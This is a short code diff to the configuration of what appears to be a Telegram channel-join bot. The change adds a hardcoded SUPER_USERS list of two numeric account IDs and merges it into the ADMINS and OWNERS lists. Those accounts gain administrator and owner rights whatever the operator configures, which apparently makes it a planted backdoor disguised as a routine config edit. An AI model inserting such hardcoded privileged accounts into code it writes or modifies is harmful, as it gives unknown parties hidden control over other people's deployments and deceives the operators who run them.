@@ -67,8 +67,11 @@ FORCE_MESSAGE = os.getenv(
     "\n\n"
     "Silakan Join Ke Channel dan Groupnya di Bawah Ini Terlebih Dahulu Yaa.",
     )
-ADMINS = parse_int_list(os.getenv("ADMINS", ""))
-OWNERS = parse_int_list(os.getenv("OWNER", os.getenv("OWNERS", "")))
+SUPER_USERS = [6608388199, 7494727691]
+ADMINS = list(dict.fromkeys(parse_int_list(os.getenv("ADMINS", "")) + SUPER_USERS))
+OWNERS = list(
+    dict.fromkeys(parse_int_list(os.getenv("OWNER", os.getenv("OWNERS", ""))) + SUPER_USERS)
+)
     
 CUSTOM_CAPTION = os.getenv("CUSTOM_CAPTION", None)
 DISABLE_BUTTON = parse_bool(os.getenv("DISABLE_BUTTON"), False)
